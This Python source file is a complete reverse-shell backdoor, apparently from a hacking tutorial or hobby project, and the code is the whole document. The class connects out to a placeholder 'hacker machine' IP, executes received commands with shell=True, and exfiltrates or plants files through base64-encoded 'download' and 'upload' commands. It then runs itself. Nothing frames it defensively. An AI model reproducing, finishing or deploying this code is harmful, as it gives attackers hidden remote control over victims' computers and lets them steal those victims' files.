import socket
import subprocess
import json
import os 
import base64

class Backdoor:
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))

    def reliable_send(self, data):
        try:
            # Convert bytes to string if needed
            if isinstance(data, bytes):
                data = data.decode('utf-8', errors='replace')
            json_data = json.dumps(data)
            self.connection.send(json_data.encode())
        except Exception as e:
            print(f"[!] Error in reliable_send: {e}")

    def reliable_receive(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.connection.recv(4096).decode()
                return json.loads(json_data)
            except json.JSONDecodeError as e:
                print(f"JSON decode error: {e}")
                continue

    def execute_system_command(self, command):
        try:
            return subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
        except subprocess.CalledProcessError as e:
            return f"Command failed: {e.output.decode()}".encode()

    def change_working_directory(self, path):
        try:
            os.chdir(path)
            return f"Changed directory to {path}\n".encode()
        except FileNotFoundError as e:
            return f"Directory not found: {e}\n".encode()
        except Exception as e:
            return f"Error changing directory: {e}\n".encode()


    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read()).decode()  # base64 encode 

    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))  # base64 decode karke 
        return "File uploaded successfully\n".encode() if content else "No content to write\n".encode()

    def run(self):
        while True:
            command = self.reliable_receive()
            try:
                if command[0] == "exit":
                    self.connection.close()
                    exit()
                elif command[0] == "cd" and len(command) > 1:
                    command_result = self.change_working_directory(command[1]) 
                elif command[0] == "download":
                    command_result = self.read_file(command[1])  
                elif command[0] == "upload":
                    command_result = self.write_file(command[1], command[2])         
                else:
                    command_result = self.execute_system_command(command)
            except Exception as e:
                command_result = f"[!] Error: {str(e)}\n".encode()        
            self.reliable_send(command_result)    



my_backdoor = Backdoor("Enter hacker machine's ip here", "Enter port number here as integer")
my_backdoor.run()
